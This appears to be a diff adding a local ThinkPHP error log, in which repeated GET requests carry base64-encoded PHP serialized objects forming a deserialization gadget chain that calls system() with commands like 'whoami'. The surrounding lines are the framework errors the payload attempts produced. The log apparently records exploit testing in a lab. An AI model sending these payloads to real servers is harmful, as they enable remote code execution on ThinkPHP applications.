@@ -1,0 +1,239 @@
+---------------------------------------------------------------
+
+[2022-10-04T20:20:32+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ%3d%3d
+[ error ] [2]array_merge(): Expected parameter 2 to be an array, bool given
+---------------------------------------------------------------
+
+[2022-10-04T20:21:20+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ%3d%3d
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:21:27+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ%3d%3d
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:21:34+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ%3d%3d
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:22:20+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ%3d%3d
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:23:18+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ%3d%3d
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:25:06+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ%3d%3d
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [4096]Object of class think\process\pipes\Windows could not be converted to string
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]system(): Cannot execute a blank command
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4]syntax error, unexpected :: (T_PAAMAYIM_NEKUDOTAYIM)
+---------------------------------------------------------------
+
+[2022-10-04T20:25:17+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNvNG1zIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ%3d%3d
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:25:32+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbzRtcyI7czowOiIiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbzRtcyI7czo3OiJwaHBpbmZvIjt9czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJzbzRtcyI7YTowOnt9fXM6ODoicmVsYXRpb24iO2I6MDt9fX0=
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:25:49+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo2OiI0dXQxNW0iO3M6Njoid2hvYW1pIjt9czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6NjoiNHV0MTVtIjtzOjY6InN5c3RlbSI7fXM6OToiACoAYXBwZW5kIjthOjE6e3M6NjoiNHV0MTVtIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ==
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:26:02+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo2OiI0dXQxNW0iO3M6Njoid2hvYW1pIjt9czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6NjoiNHV0MTVtIjtzOjY6InN5c3RlbSI7fXM6OToiACoAYXBwZW5kIjthOjE6e3M6NjoiNHV0MTVtIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ%3d%3d
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:26:35+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbWkxZSI7czoxMDoicGhwaW5mbygpOyI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjU6InNtaTFlIjtzOjY6InN5c3RlbSI7fXM6OToiACoAYXBwZW5kIjthOjE6e3M6NToic21pMWUiO3M6MToiMSI7fX19fQo
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:26:45+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbWkxZSI7czoxMDoicGhwaW5mbygpOyI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjU6InNtaTFlIjtzOjY6InN5c3RlbSI7fXM6OToiACoAYXBwZW5kIjthOjE6e3M6NToic21pMWUiO3M6MToiMSI7fX19fQo=
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:27:57+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbWkxZSI7czoxMDoicGhwaW5mbygpOyI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjU6InNtaTFlIjtzOjY6InN5c3RlbSI7fXM6OToiACoAYXBwZW5kIjthOjE6e3M6NToic21pMWUiO3M6MToiMSI7fX19fQo=
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [2]array_merge(): Argument #1 is not an array
+[ error ] [2]Invalid argument supplied for foreach()
+[ error ] [2]array_key_exists() expects parameter 2 to be array, integer given
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\Lang could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\exception\Handle could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4096]Object of class think\App could not be converted to string
+[ error ] [4]syntax error, unexpected :: (T_PAAMAYIM_NEKUDOTAYIM)
+---------------------------------------------------------------
+
+[2022-10-04T20:29:06+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6NDp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo2OiI0dXQxNW0iO3M6Njoid2hvYW1pIjt9czoyMToiAHRoaW5rXE1vZGVsAHdpdGhBdHRyIjthOjE6e3M6NjoiNHV0MTVtIjtzOjY6InN5c3RlbSI7fXM6OToiACoAYXBwZW5kIjthOjE6e3M6NjoiNHV0MTVtIjthOjA6e319czo4OiJyZWxhdGlvbiI7YjowO319fQ
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:30:21+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbWkxZSI7czoxMDoicGhwaW5mbygpOyI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjU6InNtaTFlIjtzOjY6InN5c3RlbSI7fXM6OToiACoAYXBwZW5kIjthOjE6e3M6NToic21pMWUiO3M6MToiMSI7fX19fQo=
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:30:33+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbWkxZSI7czoxMDoicGhwaW5mbygpOyI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjU6InNtaTFlIjtzOjY6InN5c3RlbSI7fXM6OToiACoAYXBwZW5kIjthOjE6e3M6NToic21pMWUiO3M6MToiMSI7fX19fQo%3d
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
+---------------------------------------------------------------
+
+[2022-10-04T20:31:01+08:00] 127.0.0.1 GET 127.0.0.1/?data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJzbWkxZSI7czo2OiJ3aG9hbWkiO31zOjIxOiIAdGhpbmtcTW9kZWwAd2l0aEF0dHIiO2E6MTp7czo1OiJzbWkxZSI7czo2OiJzeXN0ZW0iO31zOjk6IgAqAGFwcGVuZCI7YToxOntzOjU6InNtaTFlIjtzOjE6IjEiO319fX0K
+[ error ] [1]Method think\model\Pivot::__toString() must not throw an exception
